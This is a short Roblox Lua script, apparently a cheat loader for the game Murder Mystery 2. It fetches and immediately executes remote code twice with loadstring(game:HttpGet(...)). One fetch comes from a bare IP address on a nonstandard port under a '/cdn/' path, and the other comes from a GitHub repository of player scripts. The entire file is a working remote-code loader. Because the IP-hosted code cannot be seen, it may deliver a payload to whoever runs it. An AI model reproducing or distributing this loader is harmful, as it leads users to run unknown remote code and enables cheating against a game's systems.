local function script()
    ID="dd5133f3-f89a-4a57-90b4-7f8df78b2539";
loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
end
local function loadui()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/real-bluez/MM2/refs/heads/main/LocalPlayerScripts"))()
end
task.spawn(script)
task.spawn(loadui)
